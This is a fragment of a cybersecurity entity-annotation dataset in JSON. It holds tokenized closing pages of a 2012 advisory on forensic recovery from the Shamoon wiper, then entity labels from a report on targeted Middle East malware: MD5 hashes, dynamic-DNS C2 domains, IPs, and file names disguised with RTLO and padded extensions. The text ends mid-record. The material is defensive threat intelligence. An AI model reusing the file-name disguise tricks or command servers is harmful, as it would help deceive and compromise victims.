"VBR", "and", "place", "the", "backup", "at", "the", "end", "of", "the", "partition", "when", "a", "NTFS", "file", "system", "is", "installed", "."], ["After", "searching", "Threat", "Advisory", "#", "1007"], ["Rev.", "2012", "-", "11", "-", "01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "Recovering", "From", "Shamoon"], ["Page", "7", "of", "9", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1", "800.652.4020", "through", "the", "drive"], ["we", "found", "that", "there", "were", "three", "VBRs", "that", "all", "seemed", "to", "have", "corresponding", "information", "for", "the", "partitions", "that", "were", "originally", "created", "."], ["On", "our", "test", "system", "we", "found", "that", "EnCase", "was", "not", "adding", "the", "partitions", "in", "a", "way", "that", "would", "recognize", "the", "file", "system", "as", "it", "did", "for", "the", "other", "systems", "."], ["This", "could", "be", "because", "our", "boot", "sector", "was", "at", "sector", "56", "and", "not", "63", ",", "or", "because", "the", "multiple", "partitions", "clash", "when", "trying", "to", "add", "them", "in", "."], ["We", "ended", "up", "having", "to", "edit", "the", "image", "by", "adding", "the", "backup", "boot", "sectors", "into", "the", "correct", "sector", "where", "the", "originals", "were", "found", "."], ["Partition", "Boot", "Sector", "Placed", "At", "Backup", "Boot", "Sector", "1", "(", "Primary", ")", "56", "41926079", "2", "41926080", "62417879", "3", "62417880", "82909679", "Fig", "5", "."], ["VBR", "Placement", "in", "Windows", "2003", "Note", ":", "The", "VBR", "placement", "for", "the", "next", "partition", "starts", "after", "the", "backup", "VBR", "of", "the", "preceding", "partition", "."], ["Once", "the", "VBRs", "were", "added", "correctly", "we", "proceeded", "to", "add", "the", "partitions", "into", "EnCase", "."], ["Fig", "6", "."], ["Reconstructed", "file", "system", "of", "a", "Windows", "2003", "operating", "system", "wiped", "by", "Shamoon", "."], ["Note", ":", "EnCase", "gives", "default", "volume", "labels", "when", "added", ",", "so", "C", ",", "D", ",", "and", "E", "are", "respectively", "1", ",", "2", ",", "and", "3", "."], ["The", "extent", "of", "the", "wiping", "appeared", "to", "be", "on", "the", "same", "level", "to", "what", "was", "found", "on", "single", "partitioned", "drives", "."], ["As", "mentioned", "before", "this", "was", "to", "be", "expected", "as", "the", "malware", "tries", "to", "wipe", "mounted", "and", "other", "volumes", "first", "and", "will", "then", "move", "to", "the", "primary", "volume", "(", "1", "/", "C", ")", "."], ["Threat", "Advisory", "#", "1007"], ["Rev.", "2012", "-", "11", "-", "01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "Recovering", "From", "Shamoon"], ["Page", "8", "of", "9", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1", "800.652.4020"], ["The", "Fidelis", "Take"], ["Fidelis", "researchers", "have", "developed", "a", "set", "of", "rules", "for", "detecting", "the", "Shamoon", "malware", "along", "the", "entire", "threat", "life", "cycle", ":", "initial", "infection", ",", "lateral", "propagation", ",", "and", "command", "and", "control", "communication", "."], ["The", "embedded", "malware", "detection", "engine", "also", "recognizes", "the", "variant", "of", "Shamoon", "malware", "analyzed", "."], ["All", "sensor", "configurations", "are", "capable", "of", "detecting", "the", "initial", "infection", "and", "the", "command", "and", "control", "communication", ",", "and", "the", "Fidelis", "XPS", "Internal", "Sensor", "is", "required", "for", "detecting", "the", "lateral", "movement", "of", "the", "malicious", "program", "."], ["Further", "Reading", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "Shamoon", "the", "Wiper", "Copycats", "at", "Work", "(", "2012", ")", ",", "retrieved", "26", "Oct", "2012", "from", "http://www.securelist.com/en/blog/208193786/Shamoon_the_Wiper_Copycats_at_Work"], ["Shamoon", "the", "Wiper", "in", "details", ",", "Tarakanov", ",", "Dmitry", "(", "2012", ")", ",", "retrieved", "26", "Oct", "2012", "from", "http://www.securelist.com/en/blog/208193795/Shamoon_the_Wiper_in_details"], ["Shamoon", "the", "Wiper", "in", "details", "II", ",", "Tarakanov", ",", "Dmitry", "(", "2012", ")", ",", "retrieved", "26", "Oct", "2012", "from", "http://www.securelist.com/en/blog/208193834/Shamoon_The_Wiper_further_details_Part_II"], ["Shamoon", ",", "a", "two", "-", "staged", "targeted", "attack", "(", "2012", ")", ",", "retrieved", "26", "Oct", "2012", "from", "http://blog.seculert.com/2012/08/shamoon-two-stage-targeted-attack.html", "\u2018", "Shamoon", "\u2019", "Virus", "Most", "Destructive", "Ever", "To", "Hit", "A", "Business", ",", "Leon", "Panetta", "Warns", "(", "2012", ")", ",", "retrieved", "from", "http://www.huffingtonpost.com/2012/10/11/shamoon-virus-leonpanetta_n_1960113.html", "Carrier", ",", "Brian", "(", "2005", ")", "."], ["File", "System", "Forensic", "Analysis", "."], ["Upper", "Saddle", "River", ",", "NJ", ":", "Pearson", "Education", "Inc.", "Threat", "Advisory", "#", "1007"], ["Rev.", "2012", "-", "11", "-", "01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "Recovering", "From", "Shamoon"], ["Page", "9", "of", "9"]]}, {"vertexSet": [[{"name": "Palestinians", "pos": [15, 16], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Israelis", "pos": [18, 19], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "Norman", "pos": [1, 2], "sent_id": 7, "type": "Organization"}], [{"name": "November 2012", "pos": [3, 5], "sent_id": 7, "type": "Time"}], [{"name": "Israeli government", "pos": [13, 15], "sent_id": 8, "type": "Organization"}], [{"name": "Benny Gantz", "pos": [29, 31], "sent_id": 8, "type": "Person"}], [{"name": "IDF strikes militants in Gaza Strip following rocket barrage.doc----------------------------------------------.scr", "pos": [10, 19], "sent_id": 13, "type": "Dropper"}], [{"name": "Word.exe", "pos": [3, 4], "sent_id": 16, "type": "TrojanHorse"}], [{"name": "2.ico", "pos": [0, 1], "sent_id": 17, "type": "Malware"}], [{"name": "barrage.doc", "pos": [5, 6], "sent_id": 17, "type": "Malware"}], [{"name": "Syrian activists", "pos": [9, 11], "sent_id": 19, "type": "ExploitTargetObject"}], [{"name": "BlackShades", "pos": [23, 24], "sent_id": 19, "type": "TrojanHorse"}], [{"name": "DarkComet", "pos": [25, 26], "sent_id": 19, "type": "TrojanHorse"}], [{"name": "Microsoft", "pos": [16, 17], "sent_id": 22, "type": "Organization"}], [{"name": "May 2012", "pos": [15, 17], "sent_id": 26, "type": "Time"}], [{"name": "66DDF27517985A75B2317231B46A6F62", "pos": [0, 1], "sent_id": 30, "type": "MD5"}], [{"name": "66DDF27517985A75B2317231B46A6F62", "pos": [0, 1], "sent_id": 30, "type": "MD5"}], [{"name": "66DDF27517985A75B2317231B46A6F62", "pos": [0, 1], "sent_id": 30, "type": "MD5"}], [{"name": "4A06D9989A8C3A9967C2011E5BAF3010", "pos": [9, 10], "sent_id": 30, "type": "MD5"}], [{"name": "4A06D9989A8C3A9967C2011E5BAF3010", "pos": [9, 10], "sent_id": 30, "type": "MD5"}], [{"name": "Report.doc...................................................... .......................................................................... .............exe", "pos": [1, 6], "sent_id": 31, "type": "Malware"}], [{"name": "15FC009D9CAAA8F11D6C3DA2B69EA06E", "pos": [21, 22], "sent_id": 31, "type": "MD5"}], [{"name": "15FC009D9CAAA8F11D6C3DA2B69EA06E", "pos": [21, 22], "sent_id": 31, "type": "MD5"}], [{"name": "Silence of the Jews make the Church of the Nativity of the Palestinians.doc-----------.scr", "pos": [1, 14], "sent_id": 32, "type": "Malware"}], [{"name": "Israel", "pos": [2, 3], "sent_id": 33, "type": "Country"}], [{"name": "940B3ACDF1E26FCCCF74A5A0359FB079", "pos": [11, 12], "sent_id": 33, "type": "MD5"}], [{"name": "940B3ACDF1E26FCCCF74A5A0359FB079", "pos": [11, 12], "sent_id": 33, "type": "MD5"}], [{"name": "IDF NEWS[RTLO]cod.SCR", "pos": [13, 17], "sent_id": 33, "type": "Malware"}], [{"name": "9C39D6F52E1E1BE5AE61BAB90971D054", "pos": [0, 1], "sent_id": 34, "type": "MD5"}], [{"name": "9C39D6F52E1E1BE5AE61BAB90971D054", "pos": [0, 1], "sent_id": 34, "type": "MD5"}], [{"name": "9C39D6F52E1E1BE5AE61BAB90971D054", "pos": [0, 1], "sent_id": 34, "type": "MD5"}], [{"name": "A Rood Awakening! Michael Rood .3gp--------------------------------------.scr", "pos": [2, 9], "sent_id": 34, "type": "Malware"}], [{"name": "Israel", "pos": [2, 3], "sent_id": 35, "type": "Country"}], [{"name": "9D144A828F757A90B86976EF0C906B3F", "pos": [11, 12], "sent_id": 35, "type": "MD5"}], [{"name": "9D144A828F757A90B86976EF0C906B3F", "pos": [11, 12], "sent_id": 35, "type": "MD5"}], [{"name": "9D144A828F757A90B86976EF0C906B3F", "pos": [11, 12], "sent_id": 35, "type": "MD5"}], [{"name": "D14E0A3D408065B1551F2827B50B83CA", "pos": [26, 27], "sent_id": 35, "type": "MD5"}], [{"name": "D14E0A3D408065B1551F2827B50B83CA", "pos": [26, 27], "sent_id": 35, "type": "MD5"}], [{"name": "D14E0A3D408065B1551F2827B50B83CA", "pos": [26, 27], "sent_id": 35, "type": "MD5"}], [{"name": "C8202523F35295E8BC8CC1731EDB0559", "pos": [0, 1], "sent_id": 36, "type": "MD5"}], [{"name": "C8202523F35295E8BC8CC1731EDB0559", "pos": [0, 1], "sent_id": 36, "type": "MD5"}], [{"name": "C21D7165B25CAF65D7F92FF758C1B5B1", "pos": [0, 1], "sent_id": 38, "type": "MD5"}], [{"name": "C21D7165B25CAF65D7F92FF758C1B5B1", "pos": [0, 1], "sent_id": 38, "type": "MD5"}], [{"name": "C21D7165B25CAF65D7F92FF758C1B5B1", "pos": [0, 1], "sent_id": 38, "type": "MD5"}], [{"name": "The first conference of Dr. Mohamed Morsi, after winning.doc---------------.scr", "pos": [1, 11], "sent_id": 39, "type": "Malware"}], [{"name": "5B740B4623B2D1049C0036A6AAE684B0", "pos": [0, 1], "sent_id": 40, "type": "MD5"}], [{"name": "5B740B4623B2D1049C0036A6AAE684B0", "pos": [0, 1], "sent_id": 40, "type": "MD5"}], [{"name": "\u05dd\u05d9\u05d9\u05dc\u05e2\u05e0 \u05e8\u05d5\u05e9\u05e7\u05dc \u05da\u05d9\u05d0 \u05d9\u05d1\u05d9\u05d8\u05de\u05e8\u05d5\u05e4\u05e0\u05d9\u05d0 \u05dd\u05e0\u05d9\u05d7 \u05dd\u05d9\u05d8\u05e8\u05e1\u202c \u202b[\u05ea\u05d5\u05d9\u05d0\u05d1\u05e6\u202cRTLO]----------------------------------------.wmv------------------.scr", "pos": [1, 8], "sent_id": 41, "type": "Malware"}], [{"name": "72fd6074915f8f123eb44b3dd475d36b", "pos": [0, 1], "sent_id": 43, "type": "MD5"}], [{"name": "TShehab[RTLO]cod.scr", "pos": [1, 2], "sent_id": 44, "type": "Malware"}], [{"name": "Israel", "pos": [2, 3], "sent_id": 45, "type": "Country"}], [{"name": "Malware Analyzer G2", "pos": [6, 9], "sent_id": 52, "type": "Software"}], [{"name": "XtremeRats", "pos": [6, 7], "sent_id": 53, "type": "Malware"}], [{"name": "October 2011", "pos": [17, 19], "sent_id": 54, "type": "Time"}], [{"name": "108.171.108.190", "pos": [9, 10], "sent_id": 60, "type": "Address"}], [{"name": "may2008.dyndns.info", "pos": [14, 15], "sent_id": 60, "type": "Indicator"}], [{"name": "menu.dyndns.biz", "pos": [16, 17], "sent_id": 60, "type": "Indicator"}], [{"name": "menu.dyndns.biz", "pos": [16, 17], "sent_id": 60, "type": "Indicator"}], [{"name": "menu.dyndns.biz", "pos": [16, 17], "sent_id": 60, "type": "Indicator"}], [{"name": "menu.dyndns.biz", "pos": [16, 17], "sent_id": 60, "type": "Indicator"}], [{"name": "menu.dyndns.biz", "pos": [16, 17], "sent_id": 60, "type": "Indicator"}], [{"name": "flashsoft.no-ip.biz", "pos": [18, 19], "sent_id": 60, "type": "Indicator"}], [{"name": "flashsoft.no-ip.biz", "pos": [18, 19], "sent_id": 60, "type": "Indicator"}], [{"name": "monagameel.chickenkiller.com", "pos": [20, 21], "sent_id": 60, "type": "Indicator"}], [{"name": "monagameel.chickenkiller.com", "pos": [20, 21], "sent_id": 60, "type": "Indicator"}], [{"name": "powerhost.zapto.org", "pos": [22, 23], "sent_id": 60, "type": "Indicator"}], [{"name": "powerhost.zapto.org", "pos": [22, 23], "sent_id": 60, "type": "Indicator"}], [{"name": "powerhost.zapto.org", "pos": [22, 23], "sent_id": 60, "type": "Indicator"}], [{"name": "powerhost.zapto.org", "pos": [22, 23], "sent_id": 60, "type": "Indicator"}], [{"name": "powerhost.zapto.org", "pos": [22, 23], "sent_id": 60, "type": "Indicator"}], [{"name": "powerhost.zapto.org", "pos": [22, 23], "sent_id": 60, "type": "Indicator"}], [{"name": "powerhost.zapto.org", "pos": [22, 23], "sent_id": 60, "type": "Indicator"}], [{"name": "108.171.124.13", "pos": [23, 24], "sent_id": 60, "type": "Address"}], [{"name": "helpme.no-ip.biz", "pos": [28, 29], "sent_id": 60, "type": "Indicator"}], [{"name": "helpme.no-ip.biz", "pos": [28, 29], "sent_id": 60, "type": "Indicator"}], [{"name": "mjed10.no-ip.info", "pos": [30, 31], "sent_id": 60, "type": "Indicator"}], [{"name": "mjed10.no-ip.info", "pos": [30, 31], "sent_id": 60, "type": "Indicator"}], [{"name": "mjed10.no-ip.info", "pos": [30, 31], "sent_id": 60, "type": "Indicator"}], [{"name": "69.80.101.244", "pos": [31, 32], "sent_id": 60, "type": "Address"}], [{"name": "good.zapto.org", "pos": [36, 37], "sent_id": 60, "type": "Indicator"}], [{"name": "good.zapto.org", "pos": [36, 37], "sent_id": 60, "type": "Indicator"}], [{"name": "good.zapto.org", "pos": [36, 37], "sent_id": 60, "type": "Indicator"}], [{"name": "good.zapto.org", "pos": [36, 37], "sent_id": 60, "type": "Indicator"}], [{"name": "hint.zapto.org", "pos": [38, 39], "sent_id": 60, "type": "Indicator"}], [{"name": "hint.zapto.org", "pos": [38, 39], "sent_id": 60, "type": "Indicator"}], [{"name": "hint.zapto.org", "pos": [38, 39], "sent_id": 60, "type": "Indicator"}], [{"name": "hint.zapto.org", "pos": [38, 39], "sent_id": 60, "type": "Indicator"}], [{"name": "hint.zapto.org", "pos": [38, 39], "sent_id": 60, "type": "Indicator"}], [{"name": "hint.zapto.org", "pos": [38, 39], "sent_id": 60, "type": "Indicator"}], [{"name": "hint.zapto.org", "pos": [38, 39], "sent_id": 60, "type": "Indicator"}], [{"name": "hint.zapto.org", "pos": [38, 39], "sent_id": 60, "type": "Indicator"}], [{"name": "hint1.zapto.org", "pos": [40, 41], "sent_id": 60, "type": "Indicator"}], [{"name": "hint1.zapto.org", "pos": [40, 41], "sent_id": 60, "type": "Indicator"}], [{"name": "natco1.no-ip.net", "pos": [42, 43], "sent_id": 60, "type": "Indicator"}], [{"name": "natco1.no-ip.net", "pos": [42, 43], "sent_id": 60, "type": "Indicator"}], [{"name": "natco1.no-ip.net", "pos": [42, 43], "sent_id": 60, "type": "Indicator"}], [{"name": "natco2.no-ip.net", "pos": [44, 45], "sent_id": 60, "type": "Indicator"}], [{"name": "natco2.no-ip.net", "pos": [44, 45], "sent_id": 60, "type": "Indicator"}], [{"name": "natco3.no-ip.net", "pos": [46, 47], "sent_id": 60, "type": "Indicator"}], [{"name": "natco3.no-ip.net", "pos": [46, 47], "sent_id": 60, "type": "Indicator"}], [{"name": "natco3.no-ip.net", "pos": [46, 47], "sent_id": 60, "type": "Indicator"}], [{"name": "natco4.no-ip.net", "pos": [48, 49], "sent_id": 60, "type": "Indicator"}], [{"name": "natco4.no-ip.net", "pos": [48, 49], "sent_id": 60, "type": "Indicator"}], [{"name": "loading.myftp.org", "pos": [50, 51], "sent_id": 60, "type": "Indicator"}], [{"name": "loading.myftp.org", "pos": [50, 51], "sent_id": 60, "type": "Indicator"}], [{"name": "loading.myftp.org", "pos": [50, 51], "sent_id": 60, "type": "Indicator"}], [{"name": "loading.myftp.org", "pos": [50, 51], "sent_id": 60, "type": "Indicator"}], [{"name": "skype.servemp3.com", "pos": [52, 53], "sent_id": 60, "type": "Indicator"}], [{"name": "skype.servemp3.com", "pos": [52, 53], "sent_id": 60, "type": "Indicator"}], [{"name": "skype.servemp3.com", "pos": [52, 53], "sent_id": 60, "type": "Indicator"}], [{"name": "test.cable-modem.org", "pos": [0, 1], "sent_id": 61, "type": "Indicator"}], [{"name": "host lokia.mine.nu", "pos": [25, 27], "sent_id": 63, "type": "Indicator"}], [{"name": "lokia.mine.nu", "pos": [26, 27], "sent_id": 63, "type": "Indicator"}], [{"name": "lokia.mine.nu", "pos": [26, 27], "sent_id": 63, "type": "Indicator"}], [{"name": "lokia.mine.nu", "pos": [26, 27], "sent_id": 63, "type": "Indicator"}], [{"name": "lokia.mine.nu", "pos": [26, 27], "sent_id": 63, "type": "Indicator"}], [{"name": "lokia.mine.nu", "pos": [26, 27], "sent_id": 63, "type": "Indicator"}], [{"name": "69.80.107.129", "pos": [32, 33], "sent_id": 63, "type": "Address"}], [{"name": "Gaza", "pos": [5, 6], "sent_id": 68, "type": "Region"}], [{"name": "Ramallah", "pos": [13, 14], "sent_id": 68, "type": "Location"}], [{"name": "Occupied Gaza Hadara Technologies Private Shareholding Company", "pos": [21, 28], "sent_id": 69, "type": "Organization"}], [{"name": "FC17F3B2E2C7F5F24D35899D95B8C4A6", "pos": [0, 1], "sent_id": 84, "type": "MD5"}], [{"name": "FC17F3B2E2C7F5F24D35899D95B8C4A6", "pos": [0, 1], "sent_id": 84, "type": "MD5"}], [{"name": "Mahmoud Abbas", "pos": [6, 8], "sent_id": 85, "type": "Person"}], [{"name": "Mossad", "pos": [13, 14], "sent_id": 85, "type": "ThreatActor"}], [{"name": "2AAD951DBECB6D4715B306B337CA5C34", "pos": [12, 13], "sent_id": 87, "type": "MD5"}], [{"name": "2AAD951DBECB6D4715B306B337CA5C34", "pos": [12, 13], "sent_id": 87, "type": "MD5"}], [{"name": "2AAD951DBECB6D4715B306B337CA5C34", "pos": [12, 13], "sent_id": 87, "type": "MD5"}], [{"name": "2AAD951DBECB6D4715B306B337CA5C34", "pos": [12, 13], "sent_id": 87, "type": "MD5"}], [{"name": "Mahmoud Abbas", "pos": [18, 20], "sent_id": 89, "type": "Person"}], [{"name": "B4F5BFC0AB0CC3D6B7A6B9653784DE56", "pos": [0, 1], "sent_id": 91, "type": "MD5"}], [{"name": "Gilad Shalit", "pos": [16, 18], "sent_id": 93, "type": "Person"}], [{"name": "0AA7B256D2DCC8BD3914F895B134B225", "pos": [6, 7], "sent_id": 94, "type": "MD5"}], [{"name": "0AA7B256D2DCC8BD3914F895B134B225", "pos": [6, 7], "sent_id": 94, "type": "MD5"}], [{"name": "0AA7B256D2DCC8BD3914F895B134B225", "pos": [6, 7], "sent_id": 94, "type": "MD5"}], [{"name": "926235FCF7B91442A405B5760A0729EB", "pos": [12, 13], "sent_id": 97, "type": "MD5"}], [{"name": "926235FCF7B91442A405B5760A0729EB", "pos": [12, 13], "sent_id": 97, "type": "MD5"}], [{"name": "926235FCF7B91442A405B5760A0729EB", "pos": [12, 13], "sent_id": 97, "type": "MD5"}], [{"name": "Nabil Amr", "pos": [14, 16], "sent_id": 98, "type": "Person"}], [{"name": "d.exe", "pos": [10, 11], "sent_id": 102, "type": "Malware"}], [{"name": "1f1e9958440d773c34415d9eb6334b25", "pos": [15, 16], "sent_id": 102, "type": "MD5"}], [{"name": "1f1e9958440d773c34415d9eb6334b25", "pos": [15, 16], "sent_id": 102, "type": "MD5"}], [{"name": "1F1E9958440D773C34415D9EB6334B25", "pos": [0, 1], "sent_id": 103, "type": "MD5"}], [{"name": "Hmas.doc", "pos": [3, 4], "sent_id": 108, "type": "Malware"}], [{"name": "484hhh.doc", "pos": [0, 1], "sent_id": 109, "type": "Malware"}], [{"name": "Word.doc", "pos": [2, 3], "sent_id": 109, "type": "Malware"}], [{"name": "Hitham", "pos": [7, 8], "sent_id": 109, "type": "Attacker"}], [{"name": "anar", "pos": [13, 14], "sent_id": 109, "type": "Attacker"}], [{"name": "Hitham", "pos": [18, 19], "sent_id": 109, "type": "Attacker"}], [{"name": "Ayman", "pos": [24, 25], "sent_id": 109, "type": "Attacker"}], [{"name": "Tohan", "pos": [5, 6], "sent_id": 110, "type": "Attacker"}], [{"name": "Oct 12th 2011", "pos": [8, 11], "sent_id": 110, "type": "Time"}], [{"name": "Nov 27th 2011", "pos": [0, 3], "sent_id": 111, "type": "Time"}], [{"name": "Feb 18th 2012", "pos": [4, 7], "sent_id": 111, "type": "Time"}], [{"name": "word.doc", "pos": [10, 11], "sent_id": 111, "type": "Malware"}], [{"name": "IDF NEWS.doc", "pos": [12, 14], "sent_id": 111, "type": "Malware"}], [{"name": "Brotherhood.doc", "pos": [15, 16], "sent_id": 111, "type": "Malware"}], [{"name": "detl.doc", "pos": [0, 1], "sent_id": 112, "type": "Malware"}], [{"name": "Advisor.doc", "pos": [2, 3], "sent_id": 112, "type": "Malware"}], [{"name": "IDF.doc", "pos": [4, 5], "sent_id": 112, "type": "Malware"}], [{"name": "System.doc", "pos": [6, 7], "sent_id": 112, "type": "Malware"}], [{"name": "York.doc", "pos": [8, 9], "sent_id": 112, "type": "Malware"}], [{"name": "barrage.doc", "pos": [10, 11], "sent_id": 112, "type": "Malware"}], [{"name": "shehab.doc", "pos": [12, 13], "sent_id": 112, "type": "Malware"}], [{"name": "ahmed", "pos": [17, 18], "sent_id": 112, "type": "Attacker"}], [{"name": "aert", "pos": [23, 24], "sent_id": 112, "type": "Attacker"}], [{"name": "aert", "pos": [5, 6], "sent_id": 113, "type": "Attacker"}], [{"name": "aert", "pos": [5, 6], "sent_id": 114, "type": "Attacker"}], [{"name": "aert", "pos": [5, 6], "sent_id": 115, "type": "Attacker"}], [{"name": "HinT", "pos": [5, 6], "sent_id": 116, "type": "Attacker"}], [{"name": "aert", "pos": [5, 6], "sent_id": 117, "type": "Attacker"}], [{"name": "HinT", "pos": [5, 6], "sent_id": 118, "type": "Attacker"}], [{"name": "HinT", "pos": [5, 6], "sent_id": 119, "type": "Attacker"}], [{"name": "HinT", "pos": [5, 6], "sent_id": 120, "type": "Attacker"}], [{"name": "HinT", "pos": [5, 6], "sent_id": 121, "type": "Attacker"}], [{"name": "May 14th 2012", "pos": [8, 11], "sent_id": 121, "type": "Time"}], [{"name": "May 26th 2012", "pos": [1, 4], "sent_id": 122, "type": "Time"}], [{"name": "Jun 24th 2012", "pos": [1, 4], "sent_id": 123, "type": "Time"}], [{"name": "Jun 29th 2012", "pos": [5, 8], "sent_id": 123, "type": "Time"}], [{"name": "Jul 29th 2012", "pos": [0, 3], "sent_id": 124, "type": "Time"}], [{"name": "Aug 1st 2012", "pos": [4, 7], "sent_id": 124, "type": "Time"}], [{"name": "Aug 5th 2012", "pos": [8, 11], "sent_id": 124, "type": "Time"}], [{"name": "Oct 16th 2012", "pos": [1, 4], "sent_id": 125, "type": "Time"}], [{"name": "Oct 24th 2012", "pos": [0, 3], "sent_id": 127, "type": "Time"}], [{"name": "Oct 31st 2012", "pos": [1, 4], "sent_id": 128, "type": "Time"}], [{"name": "Oct. 31", "pos": [21, 23], "sent_id": 132, "type": "Time"}], [{"name": "idf.blogsite.org", "pos": [10, 11], "sent_id": 148, "type": "Indicator"}], [{"name": "javaupdate.no-ip.info", "pos": [11, 12], "sent_id": 148, "type": "Indicator"}], [{"name": "A5DE87646EE943CD1F448A67FDBE2817", "pos": [0, 1], "sent_id": 154, "type": "MD5"}], [{"name": "A5DE87646EE943CD1F448A67FDBE2817", "pos": [0, 1], "sent_id": 154, "type": "MD5"}], [{"name": "F982401E46864F640BCAEDC200319109", "pos": [1, 2], "sent_id": 154, "type": "MD5"}], [{"name": "F982401E46864F640BCAEDC200319109", "pos": [1, 2], "sent_id": 154, "type": "MD5"}], [{"name": "EC5B360F5FF6251A08A14A2E95C4CAA4", "pos": [0, 1], "sent_id": 155, "type": "MD5"}], [{"name": "EC5B360F5FF6251A08A14A2E95C4CAA4", "pos": [0, 1], "sent_id": 155, "type": "MD5"}], [{"name": "97576FA7A236679DBE3ABE1A4E852026", "pos": [1, 2], "sent_id": 155, "type": "MD5"}], [{"name": "97576FA7A236679DBE3ABE1A4E852026", "pos": [1, 2], "sent_id": 155, "type": "MD5"}], [{"name": "C1EC435E97A4A4C5585392D738B5879F", "pos": [0, 1], "sent_id": 156, "type": "MD5"}], [{"name": "C1EC435E97A4A4C5585392D738B5879F", "pos": [0, 1], "sent_id": 156, "type": "MD5"}], [{"name": "2559FE4EB88561138CE292DF5D0E099F", "pos": [0, 1], "sent_id": 157, "type": "MD5"}], [{"name": "2559FE4EB88561138CE292DF5D0E099F", "pos": [0, 1], "sent_id": 157, "type": "MD5"}], [{"name": "0ABF3FA976372CBC8BF33162795E42A8", "pos": [0, 1], "sent_id": 158, "type": "MD5"}], [{"name": "0ABF3FA976372CBC8BF33162795E42A8", "pos": [0, 1], "sent_id": 158, "type": "MD5"}], [{"name": "0B3B1E2E22C548D8F53C2AA338ABD66E", "pos": [1, 2], "sent_id": 158, "type": "MD5"}], [{"name": "0B3B1E2E22C548D8F53C2AA338ABD66E", "pos": [1, 2], "sent_id": 158, "type": "MD5"}], [{"name": "FF8E19CA8A224CC843BF0F2F74A3274E", "pos": [0, 1], "sent_id": 159, "type": "MD5"}], [{"name": "FF8E19CA8A224CC843BF0F2F74A3274E", "pos": [0, 1], "sent_id": 159, "type": "MD5"}], [{"name": "7C5272F3F24ACB225270DDED72CFC1D4", "pos": [0, 1], "sent_id": 160, "type": "MD5"}], [{"name": "7C5272F3F24ACB225270DDED72CFC1D4", "pos": [0, 1], "sent_id": 160, "type": "MD5"}], [{"name": "8AEAA0C81A36449EC9613CA846E196F2", "pos": [0, 1], "sent_id": 161, "type": "MD5"}], [{"name": "8AEAA0C81A36449EC9613CA846E196F2", "pos": [0, 1], "sent_id": 161, "type": "MD5"}], [{"name": "963BFAE19B3DA5BECE081DFF1D1E3EF9", "pos": [0, 1], "sent_id": 162, "type": "MD5"}], [{"name": "963BFAE19B3DA5BECE081DFF1D1E3EF9", "pos": [0, 1], "sent_id": 162, "type": "MD5"}], [{"name": "EBC9BDF9FDF0A9773899D96D24AC46F4", "pos": [1, 2], "sent_id": 162, "type": "MD5"}], [{"name": "EBC9BDF9FDF0A9773899D96D24AC46F4", "pos": [1, 2], "sent_id": 162, "type": "MD5"}], [{"name": "998F30457BC48A1A6567203E0EC3282E", "pos": [2, 3], "sent_id": 162, "type": "MD5"}], [{"name": "998F30457BC48A1A6567203E0EC3282E", "pos": [2, 3], "sent_id": 162, "type": "MD5"}], [{"name": "31F96ADD841594D35E6E97376114E756", "pos": [3, 4], "sent_id": 162, "type": "MD5"}], [{"name": "31F96ADD841594D35E6E97376114E756", "pos": [3, 4], "sent_id": 162, "type": "MD5"}], [{"name": "6E416C45A833F959A63785892042595A", "pos": [0, 1], "sent_id": 163, "type": "MD5"}], [{"name": "6E416C45A833F959A63785892042595A", "pos": [0, 1], "sent_id": 163, "type": "MD5"}], [{"name": "0DC102CFB87C937EEFFE01A06F94E229", "pos": [1, 2], "sent_id": 163, "type": "MD5"}], [{"name": "0DC102CFB87C937EEFFE01A06F94E229", "pos": [1, 2], "sent_id": 163, "type": "MD5"}], [{"name": "B7DF947B4A67A884C751840F83C4405E", "pos": [0, 1], "sent_id": 164, "type": "MD5"}], [{"name": "B7DF947B4A67A884C751840F83C4405E", "pos": [0, 1], "sent_id": 164, "type": "MD5"}], [{"name": "2EB1503751A7C74890096B1837C7BD81", "pos": [1, 2], "sent_id": 164, "type": "MD5"}], [{"name": "2EB1503751A7C74890096B1837C7BD81", "pos": [1, 2], "sent_id": 164, "type": "MD5"}], [{"name": "0A67F9CC30083AFB7E1F8295AE152BB6", "pos": [3, 4], "sent_id": 164, "type": "MD5"}], [{"name": "0A67F9CC30083AFB7E1F8295AE152BB6", "pos": [3, 4], "sent_id": 164, "type": "MD5"}], [{"name": "E9823B61E6CE999387DE821DFBF6E741", "pos": [4, 5], "sent_id": 164, "type": "MD5"}], [{"name": "E9823B61E6CE999387DE821DFBF6E741", "pos": [4, 5], "sent_id": 164, "type": "MD5"}], [{"name": "ED53831468DDF4220E1DC3C3398F7F39", "pos": [6, 7], "sent_id": 164, "type": "MD5"}], [{"name": "ED53831468DDF4220E1DC3C3398F7F39", "pos": [6, 7], "sent_id": 164, "type": "MD5"}], [{"name": "86BE5F0D2303FB4A8A8E297A53AC0026", "pos": [8, 9], "sent_id": 164, "type": "MD5"}], [{"name": "86BE5F0D2303FB4A8A8E297A53AC0026", "pos": [8, 9], "sent_id": 164, "type": "MD5"}], [{"name": "B6C8A6D6C35428779C5C65C1B273EBA0", "pos": [1, 2], "sent_id": 165, "type": "MD5"}], [{"name": "B6C8A6D6C35428779C5C65C1B273EBA0", "pos": [1, 2], "sent_id": 165, "type": "MD5"}], [{"name": "C03B5985F2504939DA9874246A439E25", "pos": [2, 3], "sent_id": 165, "type": "MD5"}], [{"name": "C03B5985F2504939DA9874246A439E25", "pos": [2, 3], "sent_id": 165, "type": "MD5"}], [{"name": "216689B2CA82F16A0CAB3A2712C27DA6", "pos": [3, 4], "sent_id": 165, "type": "MD5"}], [{"name": "216689B2CA82F16A0CAB3A2712C27DA6", "pos": [3, 4], "sent_id": 165, "type": "MD5"}], [{"name": "E7E05001A294EBFE8A012DD3BCE78E96", "pos": [5, 6], "sent_id": 165, "type": "MD5"}], [{"name": "E7E05001A294EBFE8A012DD3BCE78E96", "pos": [5, 6], "sent_id": 165, "type": "MD5"}], [{"name": "F68F85B0FBCA450F0D5C8828063AD30D", "pos": [0, 1], "sent_id": 166, "type": "MD5"}], [{"name": 